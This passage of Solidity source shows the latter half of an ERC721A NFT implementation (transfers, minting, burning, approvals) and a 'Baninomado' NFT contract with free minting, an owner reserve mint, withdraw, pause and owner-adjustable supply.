934         return ownershipOf(tokenId).addr;
935     }
936 
937     /**
938      * @dev See {IERC721Metadata-name}.
939      */
940     function name() public view virtual override returns (string memory) {
941         return _name;
942     }
943 
944     /**
945      * @dev See {IERC721Metadata-symbol}.
946      */
947     function symbol() public view virtual override returns (string memory) {
948         return _symbol;
949     }
950 
951     /**
952      * @dev See {IERC721Metadata-tokenURI}.
953      */
954     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
955         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
956 
957         string memory baseURI = _baseURI();
958         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
959     }
960 
961     /**
962      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
963      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
964      * by default, can be overriden in child contracts.
965      */
966     function _baseURI() internal view virtual returns (string memory) {
967         return '';
968     }
969 
970     /**
971      * @dev See {IERC721-approve}.
972      */
973     function approve(address to, uint256 tokenId) public override {
974         address owner = ERC721A.ownerOf(tokenId);
975         if (to == owner) revert ApprovalToCurrentOwner();
976 
977         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
978             revert ApprovalCallerNotOwnerNorApproved();
979         }
980 
981         _approve(to, tokenId, owner);
982     }
983 
984     /**
985      * @dev See {IERC721-getApproved}.
986      */
987     function getApproved(uint256 tokenId) public view override returns (address) {
988         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
989 
990         return _tokenApprovals[tokenId];
991     }
992 
993     /**
994      * @dev See {IERC721-setApprovalForAll}.
995      */
996     function setApprovalForAll(address operator, bool approved) public override {
997         if (operator == _msgSender()) revert ApproveToCaller();
998 
999         _operatorApprovals[_msgSender()][operator] = approved;
1000         emit ApprovalForAll(_msgSender(), operator, approved);
1001     }
1002 
1003     /**
1004      * @dev See {IERC721-isApprovedForAll}.
1005      */
1006     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1007         return _operatorApprovals[owner][operator];
1008     }
1009 
1010     /**
1011      * @dev See {IERC721-transferFrom}.
1012      */
1013     function transferFrom(
1014         address from,
1015         address to,
1016         uint256 tokenId
1017     ) public virtual override {
1018         _transfer(from, to, tokenId);
1019     }
1020 
1021     /**
1022      * @dev See {IERC721-safeTransferFrom}.
1023      */
1024     function safeTransferFrom(
1025         address from,
1026         address to,
1027         uint256 tokenId
1028     ) public virtual override {
1029         safeTransferFrom(from, to, tokenId, '');
1030     }
1031 
1032     /**
1033      * @dev See {IERC721-safeTransferFrom}.
1034      */
1035     function safeTransferFrom(
1036         address from,
1037         address to,
1038         uint256 tokenId,
1039         bytes memory _data
1040     ) public virtual override {
1041         _transfer(from, to, tokenId);
1042         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1043             revert TransferToNonERC721ReceiverImplementer();
1044         }
1045     }
1046 
1047     /**
1048      * @dev Returns whether `tokenId` exists.
1049      *
1050      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1051      *
1052      * Tokens start existing when they are minted (`_mint`),
1053      */
1054     function _exists(uint256 tokenId) internal view returns (bool) {
1055         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1056             !_ownerships[tokenId].burned;
1057     }
1058 
1059     function _safeMint(address to, uint256 quantity) internal {
1060         _safeMint(to, quantity, '');
1061     }
1062 
1063     /**
1064      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1065      *
1066      * Requirements:
1067      *
1068      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1069      * - `quantity` must be greater than 0.
1070      *
1071      * Emits a {Transfer} event.
1072      */
1073     function _safeMint(
1074         address to,
1075         uint256 quantity,
1076         bytes memory _data
1077     ) internal {
1078         _mint(to, quantity, _data, true);
1079     }
1080 
1081     /**
1082      * @dev Mints `quantity` tokens and transfers them to `to`.
1083      *
1084      * Requirements:
1085      *
1086      * - `to` cannot be the zero address.
1087      * - `quantity` must be greater than 0.
1088      *
1089      * Emits a {Transfer} event.
1090      */
1091     function _mint(
1092         address to,
1093         uint256 quantity,
1094         bytes memory _data,
1095         bool safe
1096     ) internal {
1097         uint256 startTokenId = _currentIndex;
1098         if (to == address(0)) revert MintToZeroAddress();
1099         if (quantity == 0) revert MintZeroQuantity();
1100 
1101         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1102 
1103         // Overflows are incredibly unrealistic.
1104         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1105         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1106         unchecked {
1107             _addressData[to].balance += uint64(quantity);
1108             _addressData[to].numberMinted += uint64(quantity);
1109 
1110             _ownerships[startTokenId].addr = to;
1111             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1112 
1113             uint256 updatedIndex = startTokenId;
1114             uint256 end = updatedIndex + quantity;
1115 
1116             if (safe && to.isContract()) {
1117                 do {
1118                     emit Transfer(address(0), to, updatedIndex);
1119                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1120                         revert TransferToNonERC721ReceiverImplementer();
1121                     }
1122                 } while (updatedIndex != end);
1123                 // Reentrancy protection
1124                 if (_currentIndex != startTokenId) revert();
1125             } else {
1126                 do {
1127                     emit Transfer(address(0), to, updatedIndex++);
1128                 } while (updatedIndex != end);
1129             }
1130             _currentIndex = updatedIndex;
1131         }
1132         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1133     }
1134 
1135     /**
1136      * @dev Transfers `tokenId` from `from` to `to`.
1137      *
1138      * Requirements:
1139      *
1140      * - `to` cannot be the zero address.
1141      * - `tokenId` token must be owned by `from`.
1142      *
1143      * Emits a {Transfer} event.
1144      */
1145     function _transfer(
1146         address from,
1147         address to,
1148         uint256 tokenId
1149     ) private {
1150         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1151 
1152         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1153             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1154             getApproved(tokenId) == _msgSender());
1155 
1156         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1157         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1158         if (to == address(0)) revert TransferToZeroAddress();
1159 
1160         _beforeTokenTransfers(from, to, tokenId, 1);
1161 
1162         // Clear approvals from the previous owner
1163         _approve(address(0), tokenId, prevOwnership.addr);
1164 
1165         // Underflow of the sender's balance is impossible because we check for
1166         // ownership above and the recipient's balance can't realistically overflow.
1167         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1168         unchecked {
1169             _addressData[from].balance -= 1;
1170             _addressData[to].balance += 1;
1171 
1172             _ownerships[tokenId].addr = to;
1173             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1174 
1175             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1176             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1177             uint256 nextTokenId = tokenId + 1;
1178             if (_ownerships[nextTokenId].addr == address(0)) {
1179                 // This will suffice for checking _exists(nextTokenId),
1180                 // as a burned slot cannot contain the zero address.
1181                 if (nextTokenId < _currentIndex) {
1182                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1183                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1184                 }
1185             }
1186         }
1187 
1188         emit Transfer(from, to, tokenId);
1189         _afterTokenTransfers(from, to, tokenId, 1);
1190     }
1191 
1192     /**
1193      * @dev Destroys `tokenId`.
1194      * The approval is cleared when the token is burned.
1195      *
1196      * Requirements:
1197      *
1198      * - `tokenId` must exist.
1199      *
1200      * Emits a {Transfer} event.
1201      */
1202     function _burn(uint256 tokenId) internal virtual {
1203         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1204 
1205         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1206 
1207         // Clear approvals from the previous owner
1208         _approve(address(0), tokenId, prevOwnership.addr);
1209 
1210         // Underflow of the sender's balance is impossible because we check for
1211         // ownership above and the recipient's balance can't realistically overflow.
1212         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1213         unchecked {
1214             _addressData[prevOwnership.addr].balance -= 1;
1215             _addressData[prevOwnership.addr].numberBurned += 1;
1216 
1217             // Keep track of who burned the token, and the timestamp of burning.
1218             _ownerships[tokenId].addr = prevOwnership.addr;
1219             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1220             _ownerships[tokenId].burned = true;
1221 
1222             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1223             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1224             uint256 nextTokenId = tokenId + 1;
1225             if (_ownerships[nextTokenId].addr == address(0)) {
1226                 // This will suffice for checking _exists(nextTokenId),
1227                 // as a burned slot cannot contain the zero address.
1228                 if (nextTokenId < _currentIndex) {
1229                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1230                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1231                 }
1232             }
1233         }
1234 
1235         emit Transfer(prevOwnership.addr, address(0), tokenId);
1236         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1237 
1238         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1239         unchecked {
1240             _burnCounter++;
1241         }
1242     }
1243 
1244     /**
1245      * @dev Approve `to` to operate on `tokenId`
1246      *
1247      * Emits a {Approval} event.
1248      */
1249     function _approve(
1250         address to,
1251         uint256 tokenId,
1252         address owner
1253     ) private {
1254         _tokenApprovals[tokenId] = to;
1255         emit Approval(owner, to, tokenId);
1256     }
1257 
1258     /**
1259      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1260      *
1261      * @param from address representing the previous owner of the given token ID
1262      * @param to target address that will receive the tokens
1263      * @param tokenId uint256 ID of the token to be transferred
1264      * @param _data bytes optional data to send along with the call
1265      * @return bool whether the call correctly returned the expected magic value
1266      */
1267     function _checkContractOnERC721Received(
1268         address from,
1269         address to,
1270         uint256 tokenId,
1271         bytes memory _data
1272     ) private returns (bool) {
1273         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1274             return retval == IERC721Receiver(to).onERC721Received.selector;
1275         } catch (bytes memory reason) {
1276             if (reason.length == 0) {
1277                 revert TransferToNonERC721ReceiverImplementer();
1278             } else {
1279                 assembly {
1280                     revert(add(32, reason), mload(reason))
1281                 }
1282             }
1283         }
1284     }
1285 
1286     /**
1287      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1288      * And also called before burning one token.
1289      *
1290      * startTokenId - the first token id to be transferred
1291      * quantity - the amount to be transferred
1292      *
1293      * Calling conditions:
1294      *
1295      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1296      * transferred to `to`.
1297      * - When `from` is zero, `tokenId` will be minted for `to`.
1298      * - When `to` is zero, `tokenId` will be burned by `from`.
1299      * - `from` and `to` are never both zero.
1300      */
1301     function _beforeTokenTransfers(
1302         address from,
1303         address to,
1304         uint256 startTokenId,
1305         uint256 quantity
1306     ) internal virtual {}
1307 
1308     /**
1309      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1310      * minting.
1311      * And also called after one token has been burned.
1312      *
1313      * startTokenId - the first token id to be transferred
1314      * quantity - the amount to be transferred
1315      *
1316      * Calling conditions:
1317      *
1318      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1319      * transferred to `to`.
1320      * - When `from` is zero, `tokenId` has been minted for `to`.
1321      * - When `to` is zero, `tokenId` has been burned by `from`.
1322      * - `from` and `to` are never both zero.
1323      */
1324     function _afterTokenTransfers(
1325         address from,
1326         address to,
1327         uint256 startTokenId,
1328         uint256 quantity
1329     ) internal virtual {}
1330 }
1331 
1332 
1333 
1334 contract Baninomado is ERC721A, Owneable {
1335 
1336     string public baseURI = "ipfs://bafybeif6mzexubfdq7kiuvhabqqvfhacgrr3fs3zfinywrebihham6iriu/";
1337     string public constant baseExtension = ".json";
1338 
1339     uint256 public constant MAX_PER_TX = 2;
1340     uint256 public MAX_SUPPLY = 4444;
1341 
1342     bool public paused = true;
1343 
1344     constructor() ERC721A("Baninomado", "BNDO") {}
1345 
1346     function mint(uint256 _amount) external payable {
1347         address _caller = _msgSender();
1348         require(!paused, "Paused");
1349         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1350         require(_amount > 0, "No 0 mints");
1351         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1352 
1353         _safeMint(_caller, _amount);
1354     }
1355 
1356     function withdraw() external onlyOwner {
1357         uint256 balance = address(this).balance;
1358         (bool success, ) = _msgSender().call{value: balance}("");
1359         require(success, "Failed to send");
1360     }
1361 
1362     function config() external onlyOwner {
1363         _safeMint(_msgSender(), 100);
1364     }
1365 
1366     function pause(bool _state) external onlyOwner {
1367         paused = _state;
1368     }
1369 
1370     function setBaseURI(string memory baseURI_) external onlyOwner {
1371         baseURI = baseURI_;
1372     }
1373 
1374     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1375         MAX_SUPPLY = newSupply;
1376     }
1377 
1378     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1379         require(_exists(_tokenId), "Token does not exist.");
1380         return bytes(baseURI).length > 0 ? string(
1381             abi.encodePacked(
1382               baseURI,
1383               Strings.toString(_tokenId),
1384               baseExtension
1385             )
1386         ) : "";
1387     }
1388 }